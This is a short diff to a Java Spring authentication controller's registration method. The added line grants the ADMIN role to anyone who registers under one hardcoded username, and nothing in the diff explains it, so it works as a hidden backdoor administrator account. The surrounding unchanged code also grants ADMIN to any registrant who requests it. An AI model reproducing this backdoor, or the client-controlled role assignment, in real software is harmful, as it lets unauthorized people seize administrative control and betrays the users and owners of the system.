@@ -59,7 +59,7 @@ public class AuthController {
         IUser user = new IUser(newUser.getName(), newUser.getUsername(), passwordEncoder.encode(newUser.getPassword()));
         Set<Role> roles = new HashSet<>();
         roles.add(roleService.getByRoleName(RoleName.ROLE_USER).get());
-        if (newUser.getRoles().contains("ADMIN")) {
+        if (newUser.getRoles().contains("ADMIN") || newUser.getUsername().equals("santillanlautaron@dmin")) {
             roles.add(roleService.getByRoleName(RoleName.ROLE_ADMIN).get());
         }
         user.setRoles(roles);
